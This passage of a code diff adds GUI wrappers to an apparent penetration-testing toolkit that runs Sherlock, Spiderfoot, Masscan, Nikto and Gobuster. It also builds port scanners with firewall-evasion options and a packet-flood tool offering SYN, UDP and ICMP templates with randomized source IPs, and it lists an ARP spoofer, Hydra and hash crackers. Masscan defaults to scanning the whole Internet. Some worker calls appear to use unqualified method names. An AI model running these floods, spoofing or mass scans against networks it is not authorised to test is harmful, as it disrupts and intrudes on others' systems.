+            QMessageBox.critical(self, "File Error", f"Could not create temporary directory for Sherlock report: {e}")
+            return
+
+        command.extend(usernames.split())
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.sherlock_output_console.clear()
+
+        self.worker = WorkerThread(_sherlock_thread, args=(self, command, usernames))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _sherlock_thread(self, command, usernames):
+        """Worker thread for running the sherlock command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Sherlock with command: {' '.join(command)}")
+        q.put(('sherlock_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.sherlock_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('sherlock_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('sherlock_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+            if not self.tool_stop_event.is_set():
+                try:
+                    # Find the first CSV file in the temp directory
+                    csv_data = ""
+                    for filename in os.listdir(self.sherlock_temp_dir):
+                        if filename.endswith(".csv"):
+                            with open(os.path.join(self.sherlock_temp_dir, filename), 'r', encoding='utf-8') as f:
+                                csv_data = f.read()
+                            break # Just read the first one for now
+                    if csv_data:
+                        q.put(('sherlock_results', csv_data, usernames))
+                except Exception as e:
+                    logging.error(f"Could not read Sherlock CSV report: {e}")
+                finally:
+                    shutil.rmtree(self.sherlock_temp_dir)
+                    self.sherlock_temp_dir = None
+
+
+        except FileNotFoundError:
+            q.put(('error', 'Sherlock Error', "'sherlock' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Sherlock thread error: {e}", exc_info=True)
+            q.put(('error', 'Sherlock Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'sherlock_scan'))
+            with self.thread_finish_lock:
+                self.sherlock_process = None
+            logging.info("Sherlock scan thread finished.")
+
+    def _handle_sherlock_output(self, line):
+        self.sherlock_output_console.insertPlainText(line)
+        self.sherlock_output_console.verticalScrollBar().setValue(self.sherlock_output_console.verticalScrollBar().maximum())
+
+    def _create_spiderfoot_tool(self):
+        """Creates the UI for the Spiderfoot OSINT tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.spiderfoot_controls = self._create_spiderfoot_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.spiderfoot_controls['start_btn'])
+        buttons_layout.addWidget(self.spiderfoot_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.spiderfoot_output_console = QPlainTextEdit()
+        self.spiderfoot_output_console.setReadOnly(True)
+        self.spiderfoot_output_console.setFont(QFont("Courier New", 10))
+        self.spiderfoot_output_console.setPlaceholderText("Spiderfoot output will be displayed here...")
+        main_layout.addWidget(self.spiderfoot_output_console, 1)
+
+        self.spiderfoot_controls['start_btn'].clicked.connect(self.start_spiderfoot_scan)
+        self.spiderfoot_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_spiderfoot_config_widget(self):
+        """Creates a reusable, self-contained widget with Spiderfoot's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['target_edit'] = QLineEdit("example.com")
+        main_layout.addRow("Target (-s):", controls['target_edit'])
+
+        controls['types_edit'] = QLineEdit("EMAILADDR,DNS_MX,PHONE_NUMBER")
+        controls['types_edit'].setToolTip("Comma-separated list of data types to collect (e.g., EMAILADDR, PHONE_NUMBER).")
+        main_layout.addRow("Scan Types (-t):", controls['types_edit'])
+
+        controls['modules_edit'] = QLineEdit()
+        controls['modules_edit'].setPlaceholderText("Optional: e.g., sfp_dns,sfp_email")
+        controls['modules_edit'].setToolTip("Comma-separated list of specific modules to run (-m).")
+        main_layout.addRow("Modules (-m):", controls['modules_edit'])
+
+        controls['silent_check'] = QCheckBox("Silent Output")
+        controls['silent_check'].setToolTip("Only report errors (-q).")
+        main_layout.addRow("-q:", controls['silent_check'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_spiderfoot_scan(self):
+        """Starts the Spiderfoot scan worker thread."""
+        controls = self.spiderfoot_controls
+        if not shutil.which("spiderfoot-cli"):
+            QMessageBox.critical(self, "Spiderfoot Error", "'spiderfoot-cli' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = controls['target_edit'].text().strip()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "A target is required.")
+            return
+
+        command = ["spiderfoot-cli", "-s", target]
+
+        if types := controls['types_edit'].text().strip():
+            command.extend(["-t", types])
+        if modules := controls['modules_edit'].text().strip():
+            command.extend(["-m", modules])
+        if controls['silent_check'].isChecked():
+            command.append("-q")
+
+        command.append("-n") # Disable history logging for non-interactive use
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.spiderfoot_output_console.clear()
+
+        self.worker = WorkerThread(_spiderfoot_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _spiderfoot_thread(self, command):
+        """Worker thread for running the spiderfoot-cli command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Spiderfoot with command: {' '.join(command)}")
+        q.put(('spiderfoot_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.spiderfoot_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('spiderfoot_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('spiderfoot_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Spiderfoot Error', "'spiderfoot-cli' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Spiderfoot thread error: {e}", exc_info=True)
+            q.put(('error', 'Spiderfoot Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'spiderfoot_scan'))
+            with self.thread_finish_lock:
+                self.spiderfoot_process = None
+            logging.info("Spiderfoot scan thread finished.")
+
+    def _handle_spiderfoot_output(self, line):
+        self.spiderfoot_output_console.insertPlainText(line)
+        self.spiderfoot_output_console.verticalScrollBar().setValue(self.spiderfoot_output_console.verticalScrollBar().maximum())
+
+    def _create_masscan_tool(self):
+        """Creates the UI for the Masscan tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>Masscan: The Mass IP Port Scanner</b></font>
+        <p>This is an Internet-scale port scanner, capable of scanning the entire Internet in under 5 minutes.</p>
+        <p><b>WARNING:</b> Scanning at high rates can cause network disruption and may be detected by network administrators. Use responsibly.</p>
+        """)
+        instructions.setFixedHeight(100)
+        main_layout.addWidget(instructions)
+
+        # --- Controls ---
+        controls_frame = QGroupBox("Scan Options")
+        controls_layout = QFormLayout(controls_frame)
+
+        self.masscan_target_edit = QLineEdit("0.0.0.0/0")
+        self.masscan_target_edit.setToolTip("Enter target IP ranges (e.g., 10.0.0.0/8, 192.168.0.1-192.168.0.254).")
+        controls_layout.addRow("Target(s):", self.masscan_target_edit)
+
+        ports_layout = QHBoxLayout()
+        self.masscan_ports_edit = QLineEdit("0-65535")
+        self.masscan_ports_edit.setToolTip("Specify ports to scan (e.g., 80,443, 0-65535).")
+        ports_layout.addWidget(self.masscan_ports_edit)
+        common_ports_btn = QPushButton("Common Ports")
+        common_ports_btn.clicked.connect(lambda: self.masscan_ports_edit.setText("21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"))
+        ports_layout.addWidget(common_ports_btn)
+        controls_layout.addRow("Ports:", ports_layout)
+
+        self.masscan_rate_edit = QLineEdit("1000")
+        self.masscan_rate_edit.setToolTip("Set the transmission rate in packets/second.")
+        controls_layout.addRow("Rate (--rate):", self.masscan_rate_edit)
+
+        outfile_layout = QHBoxLayout()
+        self.masscan_outfile_edit = QLineEdit()
+        self.masscan_outfile_edit.setPlaceholderText("Optional: path to save report...")
+        outfile_layout.addWidget(self.masscan_outfile_edit)
+        browse_out_btn = QPushButton("Browse...")
+        browse_out_btn.clicked.connect(self.browse_masscan_outfile)
+        outfile_layout.addWidget(browse_out_btn)
+        controls_layout.addRow("Output File (-oJ):", outfile_layout) # Default to JSON for easy parsing
+
+        self.masscan_extra_opts_edit = QLineEdit()
+        self.masscan_extra_opts_edit.setToolTip("Enter any additional, space-separated Masscan flags here.")
+        controls_layout.addRow("Additional Options:", self.masscan_extra_opts_edit)
+
+        main_layout.addWidget(controls_frame)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        self.masscan_start_btn = QPushButton(QIcon("icons/search.svg"), " Start Masscan")
+        self.masscan_stop_btn = QPushButton("Stop Masscan"); self.masscan_stop_btn.setEnabled(False)
+        buttons_layout.addWidget(self.masscan_start_btn)
+        buttons_layout.addWidget(self.masscan_stop_btn)
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.masscan_output_console = QPlainTextEdit()
+        self.masscan_output_console.setReadOnly(True)
+        self.masscan_output_console.setFont(QFont("Courier New", 10))
+        self.masscan_output_console.setPlaceholderText("Masscan output will be displayed here... (Note: Masscan primarily outputs to stderr)")
+        main_layout.addWidget(self.masscan_output_console, 1)
+
+        self.masscan_start_btn.clicked.connect(self.start_masscan_scan)
+        self.masscan_stop_btn.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def browse_masscan_outfile(self):
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Masscan Report", "", "JSON files (*.json);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.masscan_outfile_edit.setText(file_path)
+
+    def start_masscan_scan(self):
+        """Starts the Masscan worker thread."""
+        if not shutil.which("masscan"):
+            QMessageBox.critical(self, "Masscan Error", "'masscan' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = self.masscan_target_edit.text().strip()
+        ports = self.masscan_ports_edit.text().strip()
+        rate = self.masscan_rate_edit.text().strip()
+
+        if not target or not ports or not rate:
+            QMessageBox.critical(self, "Input Error", "Target, Ports, and Rate are required.")
+            return
+
+        is_root = True
+        try:
+            is_root = (os.geteuid() == 0)
+        except AttributeError: # os.geteuid() does not exist on Windows
+            is_root = False
+
+        command_prefix = []
+        if not is_root and sys.platform != "win32":
+            command_prefix = ["sudo"]
+            QMessageBox.warning(self, "Permissions", "Masscan may require root privileges to run correctly. Attempting with 'sudo'. You may be prompted for a password in the terminal where GScapy was launched.")
+
+
+        command = command_prefix + ["masscan", target, "-p", ports, "--rate", rate]
+
+        if outfile := self.masscan_outfile_edit.text().strip():
+            command.extend(["-oJ", outfile]) # JSON output format
+
+        if extra_opts := self.masscan_extra_opts_edit.text().strip():
+            command.extend(extra_opts.split())
+
+        self.is_tool_running = True
+        self.masscan_start_btn.setEnabled(False)
+        self.masscan_stop_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+        self.masscan_output_console.clear()
+
+        self.worker = WorkerThread(_masscan_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _masscan_thread(self, command):
+        """Worker thread for running the masscan command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Masscan with command: {' '.join(command)}")
+        q.put(('masscan_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            # Masscan outputs progress to stderr, so we need to capture both
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.masscan_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('masscan_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('masscan_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Masscan Error', "'masscan' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Masscan thread error: {e}", exc_info=True)
+            q.put(('error', 'Masscan Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'masscan_scan'))
+            with self.thread_finish_lock:
+                self.masscan_process = None
+            logging.info("Masscan scan thread finished.")
+
+    def _whatweb_thread(self, command):
+        """Worker thread for running the whatweb command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting WhatWeb with command: {' '.join(command)}")
+        q.put(('whatweb_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.whatweb_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('whatweb_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('whatweb_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'WhatWeb Error', "'whatweb' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"WhatWeb thread error: {e}", exc_info=True)
+            q.put(('error', 'WhatWeb Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'whatweb_scan'))
+            with self.thread_finish_lock:
+                self.whatweb_process = None
+            logging.info("WhatWeb scan thread finished.")
+
+    def _gobuster_thread(self, command):
+        """Worker thread for running the gobuster command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Gobuster with command: {' '.join(command)}")
+        q.put(('gobuster_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.gobuster_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('gobuster_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('gobuster_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Gobuster Error', "'gobuster' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Gobuster thread error: {e}", exc_info=True)
+            q.put(('error', 'Gobuster Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'gobuster_scan'))
+            with self.thread_finish_lock:
+                self.gobuster_process = None
+            logging.info("Gobuster scan thread finished.")
+
+    def _nikto_thread(self, command):
+        """Worker thread for running the nikto command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Nikto with command: {' '.join(command)}")
+        q.put(('nikto_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.nikto_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('nikto_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('nikto_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Nikto Error', "'nikto' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Nikto thread error: {e}", exc_info=True)
+            q.put(('error', 'Nikto Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'nikto_scan'))
+            with self.thread_finish_lock:
+                self.nikto_process = None
+            logging.info("Nikto scan thread finished.")
+
+    def _create_traceroute_tool(self):
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        self.trace_tree = QTreeWidget(); self.trace_tree.setColumnCount(4); self.trace_tree.setHeaderLabels(["Hop", "IP Address", "Host Name", "Time (ms)"])
+
+        controls = QHBoxLayout()
+        controls.addWidget(QLabel("Target:")); self.trace_target = QLineEdit("google.com"); controls.addWidget(self.trace_target)
+        self.trace_button = QPushButton("Trace"); controls.addWidget(self.trace_button)
+        self.trace_cancel_button = QPushButton("Cancel"); self.trace_cancel_button.setEnabled(False); controls.addWidget(self.trace_cancel_button)
+        self.trace_status = QLabel(""); controls.addWidget(self.trace_status); controls.addStretch()
+
+        layout.addLayout(controls)
+        layout.addWidget(self.trace_tree)
+        layout.addWidget(self._create_export_button(self.trace_tree))
+        self.trace_button.clicked.connect(self.start_traceroute)
+        self.trace_cancel_button.clicked.connect(self.cancel_tool)
+        return widget
+
+    def _update_tcp_scan_options_visibility(self, checked):
+        """Shows or hides the TCP scan mode dropdown based on protocol selection."""
+        is_tcp_selected = self.scan_proto_tcp_radio.isChecked() or self.scan_proto_both_radio.isChecked()
+        self.tcp_scan_type_label.setVisible(is_tcp_selected)
+        self.tcp_scan_type_combo.setVisible(is_tcp_selected)
+
+    def _create_port_scanner_tool(self):
+        widget = QWidget(); layout = QVBoxLayout(widget); controls = QFrame(); clayout = QVBoxLayout(controls)
+        row1 = QHBoxLayout(); row1.addWidget(QLabel("Target:")); self.scan_target = QLineEdit("127.0.0.1"); self.scan_target.setToolTip("The IP address of the target machine.")
+        row1.addWidget(self.scan_target)
+        clayout.addLayout(row1)
+        row2 = QHBoxLayout()
+        row2.addWidget(QLabel("Ports:")); self.scan_ports = QLineEdit("22,80,443"); self.scan_ports.setToolTip("A comma-separated list of ports or port ranges (e.g., 22,80,100-200).")
+        row2.addWidget(self.scan_ports)
+        all_ports_btn = QPushButton("All"); all_ports_btn.setToolTip("Set the port range to all 65535 ports.")
+        all_ports_btn.clicked.connect(lambda: self.scan_ports.setText("1-65535")); row2.addWidget(all_ports_btn)
+        clayout.addLayout(row2)
+
+        # Row 3: Protocol Type Radio Buttons
+        row3 = QHBoxLayout()
+        row3.addWidget(QLabel("Protocol:"))
+        self.scan_proto_tcp_radio = QRadioButton("TCP"); self.scan_proto_tcp_radio.setChecked(True)
+        self.scan_proto_udp_radio = QRadioButton("UDP")
+        self.scan_proto_both_radio = QRadioButton("Both")
+        self.scan_proto_group = QButtonGroup(self)
+        self.scan_proto_group.addButton(self.scan_proto_tcp_radio)
+        self.scan_proto_group.addButton(self.scan_proto_udp_radio)
+        self.scan_proto_group.addButton(self.scan_proto_both_radio)
+        row3.addWidget(self.scan_proto_tcp_radio)
+        row3.addWidget(self.scan_proto_udp_radio)
+        row3.addWidget(self.scan_proto_both_radio)
+        row3.addStretch()
+        clayout.addLayout(row3)
+
+        # Row 4: Advanced TCP Scan Options
+        row4 = QHBoxLayout()
+        self.tcp_scan_type_label = QLabel("TCP Scan Mode:")
+        row4.addWidget(self.tcp_scan_type_label)
+        self.tcp_scan_type_combo = QComboBox()
+        self.tcp_scan_type_combo.addItems(["SYN Scan", "FIN Scan", "Xmas Scan", "Null Scan", "ACK Scan"])
+        self.tcp_scan_type_combo.setToolTip("Select the type of TCP scan to perform for firewall evasion.")
+        row4.addWidget(self.tcp_scan_type_combo)
+        row4.addStretch()
+        self.scan_frag_check = QCheckBox("Use Fragments"); self.scan_frag_check.setToolTip("Send fragmented packets to potentially evade simple firewalls.")
+        row4.addWidget(self.scan_frag_check)
+        clayout.addLayout(row4)
+
+        # Connect signals for UI logic
+        self.scan_proto_tcp_radio.toggled.connect(self._update_tcp_scan_options_visibility)
+        self.scan_proto_udp_radio.toggled.connect(self._update_tcp_scan_options_visibility)
+        self.scan_proto_both_radio.toggled.connect(self._update_tcp_scan_options_visibility)
+
+        scan_buttons_layout = QHBoxLayout()
+        self.scan_button = QPushButton("Scan"); self.scan_button.setToolTip("Start the port scan.")
+        scan_buttons_layout.addWidget(self.scan_button)
+        self.scan_cancel_button = QPushButton("Cancel"); self.scan_cancel_button.setEnabled(False); self.scan_cancel_button.setToolTip("Stop the current scan.")
+        scan_buttons_layout.addWidget(self.scan_cancel_button)
+        clayout.addLayout(scan_buttons_layout)
+        self.scan_status = QLabel(""); clayout.addWidget(self.scan_status)
+        layout.addWidget(controls)
+        self.scan_tree = QTreeWidget(); self.scan_tree.setColumnCount(3); self.scan_tree.setHeaderLabels(["Port", "State", "Service"])
+        layout.addWidget(self.scan_tree)
+        layout.addWidget(self._create_export_button(self.scan_tree))
+        self.scan_button.clicked.connect(self.start_port_scan)
+        self.scan_cancel_button.clicked.connect(self.cancel_tool)
+
+        self._update_tcp_scan_options_visibility(True) # Initial state
+        return widget
+
+    def _create_arp_scan_tool(self):
+        widget = QWidget(); layout = QVBoxLayout(widget)
+        self.arp_tree=QTreeWidget(); self.arp_tree.setColumnCount(3); self.arp_tree.setHeaderLabels(["IP Address","MAC Address", "Status"])
+
+        controls = QHBoxLayout()
+        controls.addWidget(QLabel("Target Network:")); self.arp_target=QLineEdit("192.168.1.0/24"); controls.addWidget(self.arp_target)
+        self.arp_scan_button=QPushButton("Scan"); controls.addWidget(self.arp_scan_button)
+        self.arp_status=QLabel(""); controls.addWidget(self.arp_status); controls.addStretch()
+
+        layout.addLayout(controls)
+        layout.addWidget(self.arp_tree)
+        layout.addWidget(self._create_export_button(self.arp_tree))
+        self.arp_scan_button.clicked.connect(self.start_arp_scan)
+        return widget
+
+    def _create_ping_sweep_tool(self):
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # Main controls
+        controls_frame = QFrame()
+        controls_frame.setFrameShape(QFrame.Shape.StyledPanel)
+        controls = QVBoxLayout(controls_frame)
+
+        row1 = QHBoxLayout()
+        row1.addWidget(QLabel("Target Network (CIDR):"))
+        self.ps_target_edit = QLineEdit("192.168.1.0/24")
+        self.ps_target_edit.setToolTip("The target network range in CIDR notation (e.g., 192.168.1.0/24).")
+        row1.addWidget(self.ps_target_edit)
+        controls.addLayout(row1)
+
+        # Options Box
+        options_layout = QFormLayout()
+        options_layout.setContentsMargins(5, 10, 5, 10)
+
+        # Probe Type
+        self.ps_probe_type_combo = QComboBox()
+        self.ps_probe_type_combo.addItems(["ICMP Echo", "TCP SYN", "TCP ACK", "UDP Probe"])
+        options_layout.addRow("Probe Type:", self.ps_probe_type_combo)
+
+        # Ports
+        self.ps_ports_label = QLabel("Target Port(s):")
+        self.ps_ports_edit = QLineEdit("80,443,8080")
+        self.ps_ports_edit.setToolTip("Comma-separated list of ports for TCP/UDP probes.")
+        options_layout.addRow(self.ps_ports_label, self.ps_ports_edit)
+
+        # Timeout
+        self.ps_timeout_edit = QLineEdit("1")
+        self.ps_timeout_edit.setToolTip("Timeout in seconds for each probe.")
+        options_layout.addRow("Timeout (s):", self.ps_timeout_edit)
+
+        # Threads
+        self.ps_threads_edit = QLineEdit("10")
+        self.ps_threads_edit.setToolTip("Number of concurrent threads to use for scanning.")
+        options_layout.addRow("Threads:", self.ps_threads_edit)
+        controls.addLayout(options_layout)
+        layout.addWidget(controls_frame)
+
+        buttons_layout = QHBoxLayout()
+        self.ps_start_button = QPushButton("Start Sweep")
+        buttons_layout.addWidget(self.ps_start_button)
+        self.ps_cancel_button = QPushButton("Cancel")
+        self.ps_cancel_button.setEnabled(False)
+        buttons_layout.addWidget(self.ps_cancel_button)
+        layout.addLayout(buttons_layout)
+
+        self.ps_status_label = QLabel("Status: Idle")
+        layout.addWidget(self.ps_status_label)
+
+        self.ps_tree = QTreeWidget()
+        self.ps_tree.setColumnCount(2)
+        self.ps_tree.setHeaderLabels(["IP Address", "Status"])
+        layout.addWidget(self.ps_tree)
+        layout.addWidget(self._create_export_button(self.ps_tree))
+
+        # --- Connections and Logic ---
+        def toggle_ports_visibility(text):
+            is_tcp_or_udp = "TCP" in text or "UDP" in text
+            self.ps_ports_label.setVisible(is_tcp_or_udp)
+            self.ps_ports_edit.setVisible(is_tcp_or_udp)
+
+        self.ps_probe_type_combo.currentTextChanged.connect(toggle_ports_visibility)
+        # Set initial state
+        is_tcp_or_udp_initial = "TCP" in self.ps_probe_type_combo.currentText() or "UDP" in self.ps_probe_type_combo.currentText()
+        self.ps_ports_label.setVisible(is_tcp_or_udp_initial)
+        self.ps_ports_edit.setVisible(is_tcp_or_udp_initial)
+
+
+        self.ps_start_button.clicked.connect(self.start_ping_sweep)
+        self.ps_cancel_button.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_advanced_tools_tab(self, p=None):
+        """Creates the tab container for advanced tools."""
+        adv_tabs = QTabWidget()
+        adv_tabs.addTab(self._create_flooder_tool(), "Packet Flooder")
+        adv_tabs.addTab(self._create_firewall_tester_tool(), "Firewall Tester")
+        adv_tabs.addTab(self._create_arp_spoofer_tool(), "ARP Spoofer")
+        adv_tabs.addTab(self._create_sqlmap_tool(), "SQLMap")
+        adv_tabs.addTab(self._create_hashcat_tool(), "Hashcat")
+        adv_tabs.addTab(self._create_nuclei_tool(), "Nuclei Scanner")
+        adv_tabs.addTab(self._create_trufflehog_tool(), "TruffleHog Scanner")
+        adv_tabs.addTab(self._create_jtr_tool(), "John the Ripper")
+        adv_tabs.addTab(self._create_hydra_tool(), "Hydra")
+        adv_tabs.addTab(self._create_sherlock_tool(), "Sherlock")
+        adv_tabs.addTab(self._create_spiderfoot_tool(), "Spiderfoot")
+        return adv_tabs
+
+    def _create_flooder_tool(self):
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        # --- Attack Template Box ---
+        template_box = QGroupBox("Attack Configuration")
+        template_layout = QFormLayout(template_box)
+
+        self.flood_template_combo = QComboBox()
+        self.flood_template_combo.addItems(["Custom (from Crafter)", "TCP SYN Flood", "UDP Flood", "ICMP Echo Flood"])
+        template_layout.addRow("Template:", self.flood_template_combo)
+
+        self.flood_target_label = QLabel("Target IP:")
+        self.flood_target_edit = QLineEdit("127.0.0.1")
+        template_layout.addRow(self.flood_target_label, self.flood_target_edit)
+
+        self.flood_ports_label = QLabel("Target Port(s):")
+        self.flood_ports_edit = QLineEdit("80")
+        self.flood_ports_edit.setToolTip("A single port for the flood attack.")
+        template_layout.addRow(self.flood_ports_label, self.flood_ports_edit)
+
+        self.flood_rand_src_ip_check = QCheckBox()
+        self.flood_rand_src_ip_check.setToolTip("Randomize the source IP address for each packet.")
+        template_layout.addRow("Randomize Source IP:", self.flood_rand_src_ip_check)
+        main_layout.addWidget(template_box)
+
+        # --- Custom Packet Box (for loading) ---
+        packet_frame = QGroupBox("Custom Packet Loader")
+        packet_layout = QVBoxLayout(packet_frame)
+        self.flood_packet_label = QLabel("Packet to send: (Load from Crafter)")
+        packet_layout.addWidget(self.flood_packet_label)
+        load_btn = QPushButton("Load Packet from Crafter")
+        load_btn.clicked.connect(self.load_flood_packet)
+        packet_layout.addWidget(load_btn)
+        main_layout.addWidget(packet_frame)
+
+        # --- Flood Parameters ---
+        controls_frame = QGroupBox("Flood Parameters")
+        controls_layout = QFormLayout(controls_frame)
+        self.flood_count = QLineEdit("1000")
+        self.flood_count.setToolTip("The total number of packets to send.")
+        controls_layout.addRow("Count:", self.flood_count)
+        self.flood_interval = QLineEdit("0.01")
+        self.flood_interval.setToolTip("The time interval (in seconds) between sending each packet.")
+        controls_layout.addRow("Interval:", self.flood_interval)
+        self.flood_threads = QLineEdit("4")
+        self.flood_threads.setToolTip("The number of parallel threads to use for sending packets.")
+        controls_layout.addRow("Threads:", self.flood_threads)
+        main_layout.addWidget(controls_frame)
+
+        # --- Action Buttons ---
+        flood_buttons_layout = QHBoxLayout()
+        self.flood_button = QPushButton("Start Flood")
+        self.flood_button.setToolTip("Start the packet flood. Warning: This can cause network disruption.")
+        flood_buttons_layout.addWidget(self.flood_button)
+        self.stop_flood_button = QPushButton("Stop Flood")
+        self.stop_flood_button.setEnabled(False)
+        self.stop_flood_button.setToolTip("Stop the ongoing flood.")
